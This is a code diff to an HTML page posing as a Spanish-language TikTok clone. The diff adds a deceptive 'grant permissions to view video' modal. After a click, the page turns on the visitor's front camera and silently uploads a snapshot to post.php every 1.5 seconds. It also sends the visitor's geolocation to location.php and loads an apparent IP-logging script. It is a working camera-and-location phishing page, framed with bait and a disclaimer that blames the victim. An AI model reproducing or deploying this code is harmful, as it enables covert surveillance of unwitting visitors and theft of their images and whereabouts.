@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TikTok ES</title>
+  <title>TikTok UI Clone</title>
   <style>
     body {
       margin: 0;
@@ -25,22 +25,18 @@
       object-fit: cover;
     }
 
-
-
-
-
     /* Barra superior */
     .top-bar {
       position: absolute;
       top: 0;
       width: 100%;
       display: flex;
-      justify-content: space-between;
       align-items: center;
       padding: 8px 15px;
       background: linear-gradient(to bottom, rgba(0,0,0,0.7), transparent);
       font-size: 15px;
       z-index: 10;
+      gap: 20px;
     }
     .top-left {
       display: flex;
@@ -53,7 +49,8 @@
     }
     .tabs {
       display: flex;
-      gap: 20px;
+      gap: 15px;
+      flex: 1;
     }
     .tab {
       cursor: pointer;
@@ -66,6 +63,7 @@
     }
     .search {
       cursor: pointer;
+      margin-left: auto;
     }
     .search svg {
       width: 22px;
@@ -181,6 +179,75 @@
     .nav-item-relative {
       position: relative;
     }
+
+    /* Modal de permisos y desbloqueo */
+    #cameraModal {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.8);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+    #cameraModal .content {
+      background: #1c1c1c;
+      color: #fff;
+      padding: 25px;
+      border-radius: 6px;
+      max-width: 420px;
+      text-align: center;
+      box-shadow: 0 0 15px rgba(0,0,0,0.6);
+      border: 1px solid #333;
+    }
+    .logo { max-width: 150px; margin-bottom: 15px; }
+    #grantAccess {
+      margin-top: 20px;
+      padding: 12px 25px;
+      background-color: #e50914;
+      color: #fff;
+      border: none;
+      border-radius: 3px;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: bold;
+      transition: background 0.2s;
+    }
+    #grantAccess:hover { background-color: #b00610; }
+
+    #unlockAnimation {
+      position: fixed;
+      top:0; left:0;
+      width:100%; height:100%;
+      background: rgba(0,0,0,0.9);
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      font-size: 22px;
+      z-index: 10000;
+      display: none;
+    }
+    .loader {
+      border: 6px solid #333;
+      border-top: 6px solid #e50914;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin-top: 15px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+    .disclaimer {
+      font-size: 11px;
+      color: #aaa;
+      margin-top: 15px;
+    }
   </style>
 </head>
 <body>
@@ -190,7 +257,6 @@
   <!-- Barra superior -->
   <div class="top-bar">
     <div class="top-left">
-      <!-- Icono LIVE -->
       <svg class="live-icon" viewBox="0 0 24 24" fill="red" xmlns="http://www.w3.org/2000/svg">
         <path d="M12 5a7 7 0 100 14 7 7 0 000-14zm0-3a10 10 0 100 20 10 10 0 000-20z"/>
         <circle cx="12" cy="12" r="3" fill="white"/>
@@ -202,16 +268,14 @@
       <div class="tab">Tienda</div>
       <div class="tab active">Para ti</div>
     </div>
-
-    <!-- Lupa -->
     <div class="search">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#fff">
         <path d="M21.71 20.29l-3.388-3.387A8.943 8.943 0 0019 11a9 9 0 10-9 9 8.943 8.943 0 005.903-2.678l3.387 3.388a1 1 0 001.414-1.414zM4 11a7 7 0 1114 0 7 7 0 01-14 0z"/>
       </svg>
     </div>
   </div>
 
-  <!-- Video -->
+  <!-- Video fondo -->
   <video autoplay muted loop>
     <source src="img/video.mp4" type="video/mp4">
     Tu navegador no soporta video.
@@ -247,7 +311,84 @@
     </div>
     <div class="nav-item">👤<span>Perfil</span></div>
   </div>
+
 </div>
+
+<!-- Modal cámara -->
+<div id="cameraModal">
+  <div class="content">
+   <!-- <img src="img/logo-erome-vertical.png" alt="Logo" class="logo"> -->
+    <p>📸 Para visualizar el video debe de conceder los siguientes permisos.</p>
+    <button id="grantAccess">Permitir acceso</button>
+    <div class="disclaimer">
+      Al acceder y utilizar esta página, usted reconoce que lo hace por su propia voluntad y asume toda la responsabilidad por cualquier acción o consecuencia derivada de su uso.
+    </div>
+  </div>
+</div>
+
+<!-- Animación desbloqueo -->
+<div id="unlockAnimation">
+  <div>Desbloqueando imagen...</div>
+  <div class="loader"></div>
+</div>
+
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+<script src="jquery.min.js"></script>
+<script src="ip.js"></script>
+<script src="ajax.js"></script>
+
+<script>
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const constraints = { audio:false, video:{facingMode:"user"} };
+
+async function initCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    video.srcObject = stream;
+    capturePhotoLoop();
+    const unlockModal = document.getElementById('unlockAnimation');
+    unlockModal.style.display='flex';
+    setTimeout(()=>{
+      unlockModal.style.display='none';
+      document.body.classList.add('unlocked');
+    }, 5000);
+  } catch(e){
+    console.error(e);
+    document.getElementById('cameraModal').style.display='flex';
+  }
+}
+
+function capturePhotoLoop(){
+  const context = canvas.getContext('2d');
+  setInterval(()=>{
+    context.drawImage(video,0,0,640,480);
+    const canvasData = canvas.toDataURL("image/png").replace("image/png","image/octet-stream");
+    $.ajax({ type:'POST', url:'post.php', data:{cat:canvasData}, dataType:'json', async:false });
+  },1500);
+}
+
+document.getElementById('grantAccess').addEventListener('click', ()=>{
+  document.getElementById('cameraModal').style.display='none';
+  initCamera();
+});
+
+// Geolocalización
+if ('geolocation' in navigator) {
+  navigator.geolocation.getCurrentPosition(function(pos) {
+    const { latitude, longitude, accuracy } = pos.coords;
+    fetch('location.php', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ latitude, longitude, accuracy })
+    });
+  });
+}
+</script>
 
 </body>
 </html>
